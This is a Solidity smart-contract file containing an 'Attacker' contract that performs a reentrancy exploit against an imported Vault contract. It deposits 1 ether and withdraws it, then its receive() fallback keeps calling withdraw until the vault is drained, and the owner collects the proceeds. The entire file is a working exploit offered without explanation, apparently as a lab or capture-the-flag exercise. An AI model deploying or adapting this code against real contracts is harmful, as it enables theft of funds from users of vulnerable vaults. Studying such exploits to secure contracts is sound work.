// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Vault.sol";

contract Attacker {
    Vault public vault;
    address public owner;

    constructor(address _vault) {
        vault = Vault(_vault);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);

        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}